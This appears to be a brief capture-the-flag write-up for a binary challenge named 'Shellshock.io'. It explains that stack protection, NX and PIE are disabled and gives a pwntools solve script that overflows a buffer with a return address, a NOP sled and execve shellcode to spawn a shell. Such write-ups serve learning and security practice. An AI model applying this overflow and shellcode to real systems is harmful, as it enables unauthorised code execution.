# Shellshock.io

Based on the comment given, we can see that stack protection, NX and PIE is off.
Thus, we can overflow the buffer with our own shellcode and spawn a shell to
cat the flag.

## Solve Script

```py
from pwn import *

p = process("./chall")

payload = b"A" * 40
payload += p64(0x7fffffffddc0)
payload += b"\x90" * 15
payload += b"\x48\x31\xd2\x48\x31\xf6\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

p.recvline()
p.recvuntil(b"> ")

p.sendline(payload)
p.interactive()
```
